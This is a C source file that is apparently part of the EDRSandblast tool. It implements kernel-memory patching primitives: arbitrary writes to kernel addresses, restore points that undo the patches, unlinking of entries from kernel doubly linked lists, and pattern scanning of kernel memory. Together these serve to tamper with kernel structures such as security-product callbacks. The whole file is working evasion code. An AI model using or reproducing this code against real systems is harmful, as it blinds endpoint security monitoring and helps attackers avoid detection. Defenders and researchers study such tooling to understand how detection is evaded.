#include <Windows.h>
#include <stdio.h>
#include <Tchar.h>
#include "KernelCallbacks.h"
#include "KernelMemoryPrimitives.h"
#include "./memory.h"
#include "../EDRSandblast.h"

RESTORE_POINTS* RestorePoints = NULL;

void write(DWORD64 address, Value value, Size size) {
  switch (size) {
    case S1:
      WriteMemoryBYTE(address, value.byte);
      break;
    case S2:
      WriteMemoryWORD(address, value.word);
      break;
    case S4:
      WriteMemoryDWORD(address, value.dword);
      break;
    case S8:
      WriteMemoryDWORD64(address, value.dword64);
      break;
  }
}

void patch_r(DWORD64 address, DWORD64 newValue) {
  patchExplicit_r(address, (Value){ .dword64 = newValue }, (Value){ .dword64 = ReadMemoryDWORD64(address) }, S8, 0, 0);
}

void patch_o(DWORD64 address, DWORD64 newValue) {
  patchExplicit_o(address, (Value){ .dword64 = newValue }, (Value){ .dword64 = 0 }, S8, 0, 0);
}

void patchSize_r(DWORD64 address, Value newValue, Size size) {
  Value value;
  switch (size) {
    case S1:
      value.byte = ReadMemoryBYTE(address);
      break;
    case S2:
      value.word = ReadMemoryWORD(address);
      break;
    case S4:
      value.dword = ReadMemoryDWORD(address);
      break;
    case S8:
    default:
      value.dword64 = ReadMemoryDWORD64(address);
      break;
  }
  patchExplicit_r(address, newValue, value, size, 0, 0);
}
void patchSize_o(DWORD64 address, Value newValue, Size size) {
  patchExplicit_o(address, newValue, (Value){ .dword64 = 0 }, size, 0, 0);
}

void patchKnown_r(DWORD64 address, DWORD64 newValue, DWORD64 value) {
  patchExplicit_r(address, (Value){ .dword64 = newValue }, (Value){ .dword64 = value }, S8, 0, 0);
}
void patchKnown_o(DWORD64 address, DWORD64 newValue, DWORD64 value) {
  patchExplicit_o(address, (Value){ .dword64 = newValue }, (Value){ .dword64 = value }, S8, 0, 0);
}

void patchExplicit_r(DWORD64 address, Value newValue, Value value, Size size, DWORD64 refAddress, DWORD64 structAddress) {
  if (address < 0x0000800000000000) {
    _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting....\n"), address);
    DebugBreak();
    exit(1);
  }

  write(address, newValue, size);

  if (!RestorePoints) {
    RestorePoints = (RESTORE_POINTS*)calloc(1, sizeof(RESTORE_POINTS));
    RestorePoints->max = 0xff;
    RestorePoints->points = (RESTORE_POINT*)calloc(RestorePoints->max, sizeof(RESTORE_POINT));
  } else if (RestorePoints->count == RestorePoints->max) {
    RestorePoints->max *= 2;
    RestorePoints->points = (RESTORE_POINT*)realloc(RestorePoints->points, RestorePoints->max * sizeof(RESTORE_POINT));
  }

  RESTORE_POINT* point = NULL;
  for (int i = 0; i <= RestorePoints->count; i++) {
    point = &RestorePoints->points[i];
    if (point->address == address) {
      return; // keep it's original value untouched.
    }
  }

  point->value = value;
  point->size = size;
  point->address = address;
  point->refAddress = refAddress;
  point->structAddress = structAddress;

  RestorePoints->count++;
}
void patchExplicit_o(DWORD64 address, Value newValue, Value value, Size size, DWORD64 refAddress, DWORD64 structAddress) {
  // Suppress unreferenced warning
  value = value;
  refAddress = refAddress;
  structAddress = structAddress;

  if (address < 0x0000800000000000) {
    _tprintf_or_not(TEXT("Userland address used: 0x%016llx\nThis should not happen, aborting...\n"), address);
    exit(1);
  }

  write(address, newValue, size);
}

void Restore() {
  for (int i = RestorePoints->count - 1; i >= 0; i--) {
    RESTORE_POINT* point = &RestorePoints->points[i];
    if (point->refAddress) {
      DWORD64 addr = ReadMemoryDWORD64(point->refAddress);
      if (addr != point->structAddress) {
        continue;
      }
    }
    write(point->address, point->value, point->size);
  }
}

BOOL includesString(TCHAR const** list, int count, TCHAR* entry) {
  for (int i = 0; i < count; ++i) {
    if (_tcscmp(entry, list[i]) == 0) {
      return TRUE;
    }
  }
  return FALSE;
}

void removeDoubleLinkedNode(DWORD64 LIST_ENTRY) {
  DWORD64 next = ReadMemoryDWORD64(LIST_ENTRY);
  DWORD64 last = ReadMemoryDWORD64(LIST_ENTRY + 8);
  PatchKnown(last, next, LIST_ENTRY);
  PatchKnown(next + 8, last, LIST_ENTRY);
}

DWORD64 patternSearch(DWORD64 start, UINT16 range, DWORD64 pattern, DWORD64 mask) {
  for (UINT16 i = 0; i < range; i++) {
    DWORD64 contents = ReadMemoryDWORD64(start + i);
    if (mask) {
      contents &= mask;
    }
    if (contents == pattern) {
      printf("Found pattern [%llx] at [%llx]\n", pattern, start + i);
      return start + i;
    }
  }

  return 0;
}

PATCH Patch = patch_r;
PATCH_SIZE PatchSize = patchSize_r;
PATCH_KNOWN PatchKnown = patchKnown_r;
PATCH_EXPLICIT PatchExplicit = patchExplicit_r;